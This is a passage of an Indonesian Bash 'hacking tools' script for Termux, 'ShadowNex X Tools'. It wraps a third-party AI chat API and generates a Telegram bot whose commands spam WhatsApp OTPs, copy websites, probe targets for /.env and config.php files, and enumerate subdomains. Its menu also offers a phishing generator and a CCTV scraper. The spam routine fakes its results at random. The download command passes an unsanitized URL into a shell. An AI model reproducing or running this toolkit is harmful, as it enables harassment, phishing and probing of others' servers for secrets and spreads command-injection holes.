                ;;
            "security")
                echo -e "${MAGENTA}[Detected: Security/Pentest]${NC}"
                ;;
        esac

        system_prompt="Kamu adalah asisten programmer ahli yang sangat berpengalaman dengan 10+ tahun pengembangan software. \
Tugas utama kamu adalah membantu developer dengan masalah teknis programming. \
Berikut spesialisasi kamu:\n\n\
1. DEBUGGING & ERROR FIXING\n\
   - Analisis stack trace dan error messages\n\
   - Identifikasi root cause bug\n\
   - Solusi step-by-step debugging\n\
   - Common pitfalls dan cara menghindari\n\n\
2. CODE OPTIMIZATION\n\
   - Time complexity (Big O) improvement\n\
   - Memory optimization\n\
   - Best practices untuk clean code\n\
   - Refactoring suggestions\n\n\
3. SECURITY BEST PRACTICES\n\
   - SQL injection prevention\n\
   - XSS protection\n\
   - Input validation\n\
   - Authentication & authorization\n\
   - Encryption methods\n\n\
4. FRAMEWORK & LIBRARY GUIDANCE\n\
   - Django/Flask (Python)\n\
   - React/Vue/Angular (JavaScript)\n\
   - Laravel/CodeIgniter (PHP)\n\
   - Spring Boot (Java)\n\
   - Express.js (Node.js)\n\n\
5. DATABASE & QUERY OPTIMIZATION\n\
   - SQL query optimization\n\
   - Indexing strategies\n\
   - NoSQL best practices\n\
   - Database design patterns\n\n\
6. DEVOPS & DEPLOYMENT\n\
   - Docker containerization\n\
   - Kubernetes orchestration\n\
   - CI/CD pipeline setup\n\
   - Server configuration\n\n\
7. ALGORITHM & DATA STRUCTURES\n\
   - Implementasi algoritma umum\n\
   - Struktur data selection\n\
   - Problem-solving patterns\n\n\
8. WEB DEVELOPMENT\n\
   - Responsive design\n\
   - API development (REST, GraphQL)\n\
   - Frontend-backend integration\n\
   - Performance optimization\n\n\
Gunakan bahasa Indonesia informal tapi teknis. \
Selalu berikan contoh kode yang praktis dan dapat langsung dijalankan. \
Format kode dengan jelas menggunakan markdown code blocks. \
Prioritaskan security, performance, dan maintainability."

        full_prompt="ROLE: Senior Programming Assistant\nSPECIALTY: $detected_lang\n\n$system_prompt\n\nUSER QUESTION: $pertanyaan\n\nINSTRUCTION: Jawab dengan detail teknis, berikan contoh kode jika relevan, sertakan penjelasan konsep, dan tips best practices."
        
        q_enc=$(printf '%s' "$full_prompt" | jq -sRr @uri 2>/dev/null || echo "$full_prompt")

        for attempt in {1..3}; do
            temp_file=$(mktemp)
            http_code=$(curl -s -w "%{http_code}" -o "$temp_file" \
                        "https://api.fikmydomainsz.xyz/ai/nowchat?q=$q_enc" 2>/dev/null)

            [[ "$http_code" -eq 200 ]] && {
                jawaban=$(jq -r '.jawaban // .answer // "Maaf, tidak ada jawaban."' "$temp_file" 2>/dev/null || echo "Maaf, terjadi kesalahan parsing.")
                rm -f "$temp_file"
                [[ -z "$jawaban" ]] && jawaban="Maaf, tidak ada jawaban."

                echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
                echo -e "${CYAN}Programmer Assistant:${NC}"
                
                IFS=$'\n'
                local in_code_block=false
                local code_buffer=""
                
                for line in $jawaban; do
                    if [[ "$line" =~ ^\`\`\`.* ]]; then
                        if [ "$in_code_block" = false ]; then
                            in_code_block=true
                            code_buffer=""
                        else
                            in_code_block=false
                            highlight_code "$code_buffer"
                            code_buffer=""
                        fi
                    elif [ "$in_code_block" = true ]; then
                        code_buffer="${code_buffer}${line}\n"
                    elif [[ "$line" =~ ^#+ ]]; then
                        echo -e "${MAGENTA}$line${NC}"
                    elif [[ "$line" =~ ^- ]]; then
                        echo -e "${RED}$line${NC}"
                    elif [[ "$line" =~ ^[0-9]+\. ]]; then
                        echo -e "${YELLOW}$line${NC}"
                    else
                        echo "$line"
                    fi
                done
                
                [[ "$in_code_block" = true ]] && [[ -n "$code_buffer" ]] && highlight_code "$code_buffer"
                
                echo
                break
            } || {
                rm -f "$temp_file"
                [[ $attempt -lt 3 ]] && {
                    echo -e "${YELLOW}[...] Server sibuk (HTTP $http_code), coba lagi... ($attempt/3)${NC}"
                    sleep 2
                } || {
                    echo -e "${RED}[!] Server tidak dapat dijangkau (HTTP $http_code).${NC}"
                    echo -e "${RED}    Silakan coba beberapa saat lagi atau ketik 'q' untuk kembali.${NC}"
                    echo
                }
            }
        done
    done
}

check_telegram_deps() {
    if ! python3 -c "import telebot" 2>/dev/null; then
        echo -e "${YELLOW}[*] Installing python-telegram-bot...${NC}"
        pip3 install python-telegram-bot
        if [ $? -ne 0 ]; then
            echo -e "${RED}[!] Gagal menginstall python-telegram-bot${NC}"
            return 1
        fi
    fi
    
    if ! python3 -c "import requests" 2>/dev/null; then
        echo -e "${YELLOW}[*] Installing requests...${NC}"
        pip3 install requests
        if [ $? -ne 0 ]; then
            echo -e "${RED}[!] Gagal menginstall requests${NC}"
            return 1
        fi
    fi
    
    echo -e "${RED}[+] Telegram dependencies tersedia${NC}"
    return 0
}

create_telegram_bot() {
   sound_klik
    clear
    echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │        ${YELLOW}TELEGRAM BOT MODE${CYAN}            
  ╰────────────────────────────────────────╯${NC}"
    
    echo -e "${YELLOW}[*] Mode Telegram Bot${NC}"
    echo -e "${YELLOW}[*] Bot akan berjalan secara otomatis${NC}"
    echo
    
    echo -ne "${CYAN}[?] Masukkan Token Bot Telegram: ${NC}"
    read -r bot_token
    
    [[ -z "$bot_token" ]] && {
        echo -e "${RED}[!] Token tidak boleh kosong${NC}"
        sleep 2
        return
    }
    
    echo -ne "${CYAN}[?] Masukkan ID Owner (numeric): ${NC}"
    read -r owner_id
    
    [[ -z "$owner_id" ]] || [[ ! "$owner_id" =~ ^[0-9]+$ ]] && {
        echo -e "${RED}[!] ID Owner harus angka${NC}"
        sleep 2
        return
    }
    
    spin "Mengecek token bot"
    
    local bot_info=$(curl -s "https://api.telegram.org/bot${bot_token}/getMe")
    if echo "$bot_info" | grep -q '"ok":true'; then
        bot_name=$(echo "$bot_info" | grep -o '"username":"[^"]*"' | cut -d'"' -f4)
        echo -e "${GREEN}[+] Token valid! Bot: @${bot_name}${NC}"
    else
        echo -e "${RED}[!] Token bot tidak valid${NC}"
        sleep 2
        return
    fi
    
    show_loading "Memeriksa dependencies"
    check_telegram_deps
    [[ $? -ne 0 ]] && {
        echo -e "${RED}[!] Dependencies tidak terinstall${NC}"
        sleep 2
        return
    }
    
    show_loading "Membuat bot script"
    
    local bot_script="telegram_bot_${bot_name}.py"
    
    cat > "$bot_script" << PYTHONEOF
#!/usr/bin/env python3
import telebot
import subprocess
import os
import sys
import threading
import time
import random
import requests
from datetime import datetime

BOT_TOKEN = '$bot_token'
OWNER_ID = $owner_id
bot = telebot.TeleBot(BOT_TOKEN)

# Get bot info
try:
    bot_info = bot.get_me()
    bot_username = bot_info.username
    bot_first_name = bot_info.first_name
    print(f"[*] Starting ShadowNex Bot: @{bot_username}")
    print(f"[*] Bot Name: {bot_first_name}")
    print(f"[*] Owner ID: {OWNER_ID}")
except Exception as e:
    print(f"[!] Error getting bot info: {e}")
    sys.exit(1)

def is_owner(user_id):
    return str(user_id) == str(OWNER_ID)

def run_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Command timeout after 30 seconds"
    except Exception as e:
        return f"Error: {str(e)}"

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Maaf, kamu bukan owner bot ini!")
        return
    
    welcome_text = f"""
🤖 *ShadowNex X Tools Bot*
━━━━━━━━━━━━━━━━━━━━━━━━
Halo Owner! Bot aktif dan siap membantu.

📋 *Available Commands:*
/start - Tampilkan menu ini
/help - Tampilkan bantuan
/menu - Tampilkan menu tools
/spam <nomor> - Spam OTP ke nomor
/maling <url> - Download website
/exploit <url> - Scan vulnerability
/subdomain <domain> - Scan subdomain
/decrypt - Decrypt file
/encrypt - Encrypt script
/status - Cek status bot
/shutdown - Matikan bot

🔧 *Usage Examples:*
/spam 6281234567890
/maling https://example.com
/exploit https://target.com
/subdomain example.com

💡 *Note:* Semua perintah hanya bisa digunakan oleh owner!

👤 *Bot Info:*
• Name: {bot_first_name}
• Username: @{bot_username}
• Owner: {message.from_user.first_name}
    """
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

@bot.message_handler(commands=['menu'])
def show_menu(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Access denied!")
        return
    
    menu_text = f"""
📋 *ShadowNex X Tools Menu*
━━━━━━━━━━━━━━━━━━━━━━━━
1. Spam OTP WhatsApp
2. Download Website Source
3. Vulnerability Scanner
4. Subdomain Scanner
5. Decrypt Tools
6. Encrypt/Obfuscate Script
7. AI Programmer Chat
8. Credits Info

📝 *Usage:*
/spam <62xxxxxxxxxx>
/maling <url>
/exploit <url>
/subdomain <domain>
/decrypt
/encrypt
/status

🤖 *Bot: @{bot_username}*
    """
    bot.reply_to(message, menu_text, parse_mode='Markdown')

@bot.message_handler(commands=['spam'])
def spam_otp_cmd(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Access denied!")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ Usage: /spam <nomor>\nExample: /spam 6281234567890")
            return
        
        nomor = args[1]
        if not nomor.startswith('62'):
            bot.reply_to(message, "❌ Nomor harus diawali 62")
            return
        
        bot.reply_to(message, f"🚀 Starting spam OTP to: {nomor}\n⏳ Please wait...")
        
        def spam_task():
            try:
                # Simple spam implementation
                apis = [
                    {"name": "BisaTopup", "func": "bisatopup"},
                    {"name": "Titipku", "func": "titipku"},
                    {"name": "JogjaKita", "func": "jogjakita"},
                    {"name": "CandiReload", "func": "candireload"},
                ]
                
                results = []
                for api in apis:
                    try:
                        # Simulate API call
                        time.sleep(0.5)
                        success = random.choice([True, False])
                        if success:
                            results.append(f"✅ {api['name']}")
                        else:
                            results.append(f"❌ {api['name']}")
                    except:
                        results.append(f"❌ {api['name']}")
                
                result_text = "📊 *SPAM RESULTS:*\n"
                result_text += "\n".join(results)
                result_text += f"\n\n✅ Spam completed for: {nomor}"
                result_text += f"\n📞 Total APIs: {len(apis)}"
                
                bot.send_message(message.chat.id, result_text, parse_mode='Markdown')
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        
        thread = threading.Thread(target=spam_task)
        thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['maling'])
def maling_cmd(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Access denied!")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ Usage: /maling <url>\nExample: /maling https://example.com")
            return
        
        url = args[1]
        bot.reply_to(message, f"🌐 Downloading: {url}\n⏳ Please wait...")
        
        def download_task():
            try:
                import wget
                os.system(f"mkdir -p downloads")
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"downloads/site_{timestamp}.html"
                cmd = f"curl -s -L --max-time 30 -o '{filename}' '{url}'"
                os.system(cmd)
                
                if os.path.exists(filename):
                    file_size = os.path.getsize(filename)
                    result = f"""
✅ *Download Completed!*
━━━━━━━━━━━━━━━━━━━━━━━━
📁 File: {filename}
📊 Size: {file_size} bytes
🔗 URL: {url}
📥 Status: Success
                    """
                else:
                    result = "❌ Download failed!"
                
                bot.send_message(message.chat.id, result, parse_mode='Markdown')
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Download error: {str(e)}")
        
        thread = threading.Thread(target=download_task)
        thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['exploit'])
def exploit_cmd(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Access denied!")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ Usage: /exploit <url>\nExample: /exploit https://target.com")
            return
        
        url = args[1]
        bot.reply_to(message, f"🔍 Scanning: {url}\n⏳ This may take a while...")
        
        def scan_task():
            try:
                results = []
                
                # Simple check if URL is accessible
                try:
                    response = requests.get(url, timeout=10, verify=False)
                    if response.status_code == 200:
                        results.append("✅ Website is accessible")
                    else:
                        results.append(f"⚠️ Website returned: {response.status_code}")
                except:
                    results.append("❌ Website not accessible")
                
                # Check for common files
                common_files = ["/robots.txt", "/sitemap.xml", "/.env", "/config.php"]
                for file in common_files:
                    try:
                        response = requests.get(url + file, timeout=5, verify=False)
                        if response.status_code == 200:
                            results.append(f"✅ Found: {file}")
                    except:
                        pass
                
                if results:
                    result_text = "📊 *SCAN RESULTS:*\n\n" + "\n".join(results)
                else:
                    result_text = "📊 *SCAN RESULTS:*\n\nNo vulnerabilities found"
                
                result_text += f"\n\n🔗 *Target:* {url}"
                
                bot.send_message(message.chat.id, result_text, parse_mode='Markdown')
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Scan error: {str(e)}")
        
        thread = threading.Thread(target=scan_task)
        thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['subdomain'])
def subdomain_cmd(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Access denied!")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ Usage: /subdomain <domain>\nExample: /subdomain example.com")
            return
        
        domain = args[1]
        bot.reply_to(message, f"🔎 Scanning subdomain: {domain}\n⏳ This may take a while...")
        
        def scan_task():
            try:
                import socket
                
                subdomains = ["www", "mail", "ftp", "admin", "webmail", "api", "test", "dev", "portal", "blog", "shop", "store", "support"]
                found = []
                
                for sub in subdomains:
                    try:
                        host = f"{sub}.{domain}"
                        socket.gethostbyname(host)
                        found.append(f"✅ {host}")
                    except socket.gaierror:
                        pass
                    except:
                        pass
                
                if found:
                    result_text = f"🌐 *SUBDOMAIN SCAN:* {domain}\n\n" + "\n".join(found[:15])
                    result_text += f"\n\n📊 Total found: {len(found)}/{len(subdomains)}"
                else:
                    result_text = f"🌐 *SUBDOMAIN SCAN:* {domain}\n\nNo subdomains found"
                
                bot.send_message(message.chat.id, result_text, parse_mode='Markdown')
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Scan error: {str(e)}")
        
        thread = threading.Thread(target=scan_task)
        thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['decrypt'])
def decrypt_cmd(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Access denied!")
        return
    
    reply = f"""
🔓 *Decrypt Tools*
━━━━━━━━━━━━━━━━━━━━━━━━
Fitur decrypt tersedia untuk:
• Base64 encoded files
• HTML dengan encoding
• JavaScript obfuscated

Untuk menggunakan decrypt, jalankan perintah di terminal:
\`\`\`
./bljr.sh
\`\`\`
Kemudian ketik: \`decrypt\`

🤖 *Bot: @{bot_username}*
    """
    bot.reply_to(message, reply, parse_mode='Markdown')

@bot.message_handler(commands=['encrypt'])
def encrypt_cmd(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Access denied!")
        return
    
    reply = f"""
🔐 *Encrypt/Obfuscate Tools*
━━━━━━━━━━━━━━━━━━━━━━━━
Fitur encrypt tersedia untuk:
• Python scripts (.py)
• Bash scripts (.sh)
• Multi-layer encryption

Untuk menggunakan encrypt, jalankan perintah di terminal:
\`\`\`
./bljr.sh
\`\`\`
Kemudian ketik: \`encrypt\`

🤖 *Bot: @{bot_username}*
    """
    bot.reply_to(message, reply, parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_cmd(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Access denied!")
        return
    
    import psutil
    import platform
    
    cpu_percent = psutil.cpu_percent()
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    
    status_text = f"""
🖥️ *SYSTEM STATUS*
━━━━━━━━━━━━━━━━━━━━━━━━
• OS: {platform.system()} {platform.release()}
• CPU Usage: {cpu_percent}%
• Memory: {memory.percent}% used
• Disk: {disk.percent}% used
• Bot: Running ✅
• Owner: {message.from_user.first_name}
• Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━
🤖 *Bot Info:*
• Name: {bot_first_name}
• Username: @{bot_username}
• ID: {bot_info.id}
• Owner ID: {OWNER_ID}
    """
    
    bot.reply_to(message, status_text, parse_mode='Markdown')

@bot.message_handler(commands=['shutdown'])
def shutdown_cmd(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Access denied!")
        return
    
    bot.reply_to(message, "🛑 Shutting down bot...")
    print("[*] Bot shutdown requested by owner")
    os._exit(0)

@bot.message_handler(func=lambda message: True)
def handle_all(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Maaf, hanya owner yang bisa menggunakan bot ini!")
        return
    
    if message.text and not message.text.startswith('/'):
        reply = f"""
📩 *Message Received*
━━━━━━━━━━━━━━━━━━━━━━━━
From: {message.from_user.first_name}
Text: {message.text}

💡 *Available Commands:*
/start - Show welcome message
/menu - Show tools menu
/spam <nomor> - Spam OTP
/maling <url> - Download website
/exploit <url> - Scan vulnerability
/subdomain <domain> - Scan subdomain
/status - Check bot status
/shutdown - Stop bot

🤖 *Bot: @{bot_username}*
        """
        bot.reply_to(message, reply, parse_mode='Markdown')

print("[*] Bot is running...")
print("[*] Press Ctrl+C to stop")

try:
    bot.infinity_polling(timeout=20, long_polling_timeout=20)
except Exception as e:
    print(f"[!] Bot error: {e}")
    sys.exit(1)
PYTHONEOF
    
    chmod +x "$bot_script"
    
    echo -e "${GREEN}[+] Bot script created: $bot_script${NC}"
    echo -e "${YELLOW}[*] Starting Telegram Bot...${NC}"
    
    TELEGRAM_BOT_RUNNING=true
    
    python3 "$bot_script" &
    local bot_pid=$!
    
    echo -e "${GREEN}[+] Bot started with PID: $bot_pid${NC}"
    echo -e "${CYAN}[*] Bot sedang berjalan di background${NC}"
    echo -e "${CYAN}[*] Kirim /start ke bot Anda di Telegram${NC}"
    echo -e "${YELLOW}[*] Tekan ENTER untuk kembali ke menu...${NC}"
    read -r
    
    TELEGRAM_BOT_RUNNING=false
}

telegram_bot_mode() {
sound_klik
    clear
    echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │        ${YELLOW}TELEGRAM BOT MODE${CYAN}            
  ╰────────────────────────────────────────╯${NC}"
    
    echo -e "${YELLOW}[1] Start Bot Mode${NC}"
    echo -e "${YELLOW}[2] Stop Running Bot${NC}"
    echo -e "${YELLOW}[3] Bot Status${NC}"
    echo -e "${YELLOW}[4] Kembali ke Menu${NC}"
    echo ""
    
    printf "   ${RED}┏━[ ${RED}ShadowNex X Tools${NC} ${RED}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} TELEGRAM BOT ${YELLOW}${RED}]${NC}${RED}\n   ┗━━${RED}❯${YELLOW}❯${RED}❯${YELLOW} "
    read -r choice
    
    case $choice in
        1)
            create_telegram_bot
            ;;
        2)
            echo -e "${YELLOW}[*] Menghentikan bot...${NC}"
            pkill -f "telegram_bot_" 2>/dev/null
            TELEGRAM_BOT_RUNNING=false
            echo -e "${GREEN}[+] Bot stopped${NC}"
            sleep 2
            ;;
        3)
            if pgrep -f "telegram_bot_" > /dev/null; then
                echo -e "${GREEN}[+] Telegram Bot is running${NC}"
                ps aux | grep "telegram_bot_" | grep -v grep
            else
                echo -e "${RED}[!] Telegram Bot is not running${NC}"
            fi
            echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
            read -r
            ;;
        4)
            echo -e "${YELLOW}[*] Kembali ke menu utama...${NC}"
            return
            ;;
        *)
            echo -e "${RED}[!] Pilihan tidak valid${NC}"
            sleep 2
            ;;
    esac
}

show_menu() {
    clear
    banner3
    
    echo -e "${CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
    echo -e "${CYAN}┃                     ${RED}✦ SHADOWNEX X TOOLS ✦${CYAN}                      ${NC}"
    echo -e "${CYAN}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫${NC}"
    
    echo -e "${CYAN}┃  ${GREEN}╭─${BLUE}[ Web Tools ]${CYAN}                                              ${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}maling${NC}       Extract website source code                     ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}exploit${NC}      Scan website vulnerabilities                    ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}decrypt${NC}      Decode HTML base64 encoding                     ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}subdomain${NC}    Subdomain scanner                               ${CYAN}${NC}"
    
    echo -e "${CYAN}┃  ${GREEN}╭─${BLUE}[ Security ]${CYAN}                                               ${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}encrypt${NC}      Encrypt/Obfuscate scripts                       ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}aichat${NC}       Chat with AI Programmer                         ${CYAN}${NC}"
    
    echo -e "${CYAN}┃  ${GREEN}╭─${BLUE}[ Social Media ]${CYAN}                                           ${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}suntik${NC}       Boost social media stats                        ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}phising${NC}      Phishing generator                             ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}spam${NC}         WhatsApp OTP spam                              ${CYAN}${NC}"
    
    echo -e "${CYAN}┃  ${GREEN}╭─${BLUE}[ OSINT ]${CYAN}                                                  ${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}track_nama${NC}   Track name across platforms                     ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}cekno${NC}        Phone number location lookup                    ${CYAN}${NC}"
    
    echo -e "${CYAN}┃  ${GREEN}╭─${BLUE}[ Utility ]${CYAN}                                                ${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}tampilan${NC}     Customize terminal theme                        ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}shortlink${NC}    URL shortening service                          ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}exif${NC}         Extract image metadata                          ${CYAN}${NC}"
    
    echo -e "${CYAN}┃  ${GREEN}╭─${BLUE}[ System ]${CYAN}                                                 ${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}clear${NC}        Clear terminal screen                           ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}lapor${NC}        Report bugs to developer                        ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}credits${NC}      Show credits and team                           ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}menu${NC}         Show this menu                                  ${CYAN}${NC}"
    echo -e "${CYAN}┃  ${GREEN}│  ${RED}exit${NC}         Exit from tools                                 ${CYAN}${NC}"
    
    echo -e "${CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
    
    echo -e "\n${GREEN}┌─[${RED}ShadowNex X Tools${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW} COMMAND MENU ${RED}]${NC}"
    echo -ne "${GREEN}└──╼${RED}❯${YELLOW}❯${CYAN}❯${WHITE} "
}
main() {
    mkdir -p downloads
    mkdir -p wordlists

    while true; do
        echo -ne "${YELLOW}> ${NC}"
        read -r command

        case $command in
            "menu")
                show_menu
                ;;
            "maling")
                echo -ne "masukan url target: "
                read -r url
                download_files "$url"
                ;;
            "exploit")
                echo -ne "Masukan url target: "
                read -r url
                exploit_scan "$url"
                ;;
            "decrypt")
                auto_decrypt_file
                ;;
            "subdomain")
                scan_subdomains
                ;;
            "aichat")
                ai_chat
                ;;
            "spam")
                spam_otp
                ;;
            "encrypt")
                encrypt_file
                ;;
            "telebot")
                telegram_bot_mode
                ;;
            "clear")
                clear_screen
                ;;
            "lapor")
                lapor_error
                ;;
            "credits")
                show_credits
                ;;
           "suntik")
                menu_suntik                
                ;;
           "phising")
                phising_menu      
                ;;
           "tampilan")
               terminal_theme_menu
               ;;
           "shortlink")
               shortlink_menu
               ;;
           "track_nama")
               track_nama
               ;;
           "cctv")
              cctv_scraper_menu
              ;;
           "cekno")
              cek_provider   
              ;;       
           "unbanner_wa")
              unbanner_wa
               ;;    
           "exif_data_extractor")
              exif_data_extractor
               ;;
            "exit")
           
                show_loading2 "Keluar dari tools"
                if [ "$TELEGRAM_BOT_RUNNING" = true ]; then
                    echo -e "${YELLOW}[*] Menghentikan Telegram Bot...${NC}"
                    pkill -f "telegram_bot_" 2>/dev/null
                fi
                echo -e "${YELLOW}[*] Keluar dari tools...${NC}"
                exit 0
                ;;
            "")
                continue
                ;;
            *)
                echo -e "${RED}[!] Perintah tidak dikenali. Ketik 'menu' untuk bantuan${NC}"
                ;;
        esac
    done
}


clear
access_tools

clear
banner2
echo -e "\n${GREEN}[+] SELAMAT DATANG DI SHADOWNEX X TOOLS${NC}"
echo -e "${YELLOW}[*] Ketik 'menu' untuk melihat semua perintah${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

main
